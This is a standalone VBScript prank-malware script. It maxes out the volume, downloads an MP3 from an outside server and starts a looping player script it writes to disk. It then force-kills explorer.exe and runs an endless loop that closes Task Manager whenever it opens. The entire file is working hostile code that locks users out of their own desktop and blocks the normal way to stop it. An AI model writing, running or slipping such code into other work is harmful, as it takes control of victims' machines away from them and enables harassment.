'Set default volume to max
set oShell = CreateObject("WScript.Shell") 
oShell.run"%SystemRoot%\System32\SndVol.exe"
oShell.SendKeys("{PGUP}") 
oShell.SendKeys("{PGUP}") 
oShell.SendKeys("{PGUP}") 
oShell.SendKeys("{PGUP}") 
oShell.SendKeys("{PGUP}") 
oShell.SendKeys("{PGUP}") 
oShell.SendKeys"%{F4}" 
WScript.Sleep 1000
Set oShell = Nothing
'init data
Dim wshNetwork : Set wshNetwork = CreateObject("WScript.Network")
Dim strUsername : strUsername = wshNetwork.UserName
'Get music data
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://pwcreatures.vercel.app/bin/music.mp3", False
xHttp.Send
with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3", 2 
end with
'Set music player sub folder
Set objFSO = CreateObject("Scripting.FileSystemObject")
strUsername = CreateObject("WScript.Network").UserName
strFolder = "C:\Users\" & strUsername & "\Downloads"
strFile = strFolder & "\LemonZS.vbs"
lines = Array( _
    "Dim wshNetwork : Set wshNetwork = CreateObject(""WScript.Network"")", _
    "Dim strUsername : strUsername = wshNetwork.UserName", _
    "Set objShell = CreateObject(""WScript.Shell"")", _
    "Set objWMPlayer = CreateObject(""WMPlayer.OCX"")", _
    "strMusicPath = ""C:\Users\"" & strUsername & ""\Downloads\LemonZS.mp3""", _
    "objWMPlayer.URL = strMusicPath", _
    "objWMPlayer.settings.setMode ""loop"", True", _
    "objWMPlayer.settings.setMode ""autoRewind"", True", _
    "objWMPlayer.controls.play", _
    "WScript.Sleep 2147483647", _ 
    "Set objShell = Nothing", _
    "Set objWMPlayer = Nothing" _
)'maximum timing allowed is 2147483647
Set objFile = objFSO.CreateTextFile(strFile, True)
For Each line In lines
    objFile.WriteLine line
Next
objFile.Close
Set objFSO = Nothing
'Call for sub folder
WScript.Sleep 2000
Set objShell = CreateObject("WScript.Shell")
strProfileFolder = objShell.ExpandEnvironmentStrings("%UserProfile%")
strBGM = strProfileFolder & "\Downloads\LemonZS.vbs"
Set objNetwork = CreateObject("WScript.Network")
strUsername = objNetwork.UserName
objShell.Run strBGM
Set objShell = Nothing
' Disable explorer.exe
Set objShell = CreateObject("WScript.Shell")
objShell.Run "taskkill /f /im explorer.exe", 0, True
' Disable Task Manager
Do
    If IsTaskManagerOpen() Then
        objShell.Run "taskkill /f /im Taskmgr.exe", 0, True 'close while testing
    End If
Loop
' Function to check if Task Manager is open
Function IsTaskManagerOpen()
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'Taskmgr.exe'")
    If colProcesses.Count > 0 Then
        IsTaskManagerOpen = True
    Else
        IsTaskManagerOpen = False
    End If
End Function